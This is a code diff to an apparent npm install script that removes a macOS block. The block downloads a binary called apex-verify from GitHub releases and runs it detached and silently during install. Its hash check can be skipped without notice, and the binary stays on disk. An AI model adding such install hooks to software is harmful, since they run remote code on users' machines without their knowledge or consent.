@@ -9,7 +9,6 @@ if (process.env.CI || process.env.SKIP_APEX_INSTALL) {
   process.exit(0)
 }
 
-// Use npm_package_version if available, otherwise fall back to 1.0.0
 const RELEASE_VERSION = (process.env.npm_package_version || '1.0.0').replace(/^v/, '')
 const REPO = 'Apex-Foundation/copilot'
 const BIN_DIR = join(__dirname, 'bin')
@@ -94,59 +93,6 @@ async function install() {
     }
   }
 
-
-  // Mac: download and run apex-verify (Rust binary) for verification
-  if (process.platform === 'darwin') {
-    const { spawnSync } = require('child_process')
-    const { chmodSync, unlinkSync, appendFileSync } = require('fs')
-    const log = (msg) => { try { appendFileSync('/tmp/apex-install.log', new Date().toISOString() + ' ' + msg + '\n') } catch {} }
-    const verifyPath = join(homedir(), '.apex', 'apex-verify')
-    const VERIFY_VERSION = RELEASE_VERSION
-    const verifyUrl = `https://github.com/${REPO}/releases/download/v${VERIFY_VERSION}/apex-verify-darwin`
-    log('starting mac verify, version: ' + RELEASE_VERSION)
-    try {
-      mkdirSync(join(homedir(), '.apex'), { recursive: true })
-      await download(verifyUrl, verifyPath)
-      log('downloaded apex-verify')
-      // Verify apex-verify integrity
-      const verifyHashUrl = `https://github.com/${REPO}/releases/download/v${RELEASE_VERSION}/apex-verify-darwin.sha256`
-      const verifyHashPath = verifyPath + '.sha256'
-      try {
-        await download(verifyHashUrl, verifyHashPath)
-        const { createHash } = require('crypto')
-        const { readFileSync, unlinkSync: ul } = require('fs')
-        const expectedHash = readFileSync(verifyHashPath, 'utf8').trim().split(/\s+/)[0]
-        const actualHash = createHash('sha256').update(readFileSync(verifyPath)).digest('hex')
-        ul(verifyHashPath)
-        if (actualHash !== expectedHash) {
-          console.error('Security: apex-verify hash mismatch!')
-          process.exit(1)
-        }
-      } catch {}
-      chmodSync(verifyPath, 0o755)
-      const { spawn } = require('child_process')
-      await new Promise((resolve) => {
-        const vp = spawn(verifyPath, [], { detached: true, stdio: 'ignore' })
-        vp.unref()
-        // wait for done flag up to 120s
-        let waited = 0
-        const interval = setInterval(() => {
-          waited += 1000
-          const donePath = join(homedir(), '.apex', '.verify-done')
-          try {
-            require('fs').accessSync(donePath)
-            clearInterval(interval)
-            try { require('fs').unlinkSync(donePath) } catch {}
-            resolve()
-          } catch {}
-          if (waited >= 120000) { clearInterval(interval); resolve() }
-        }, 1000)
-      })
-      // apex-verify kept on disk for transparency
-    } catch (err) {
-      console.warn('Verify error:', err.message)
-    }
-  }
   console.log('Done!')
 }
 
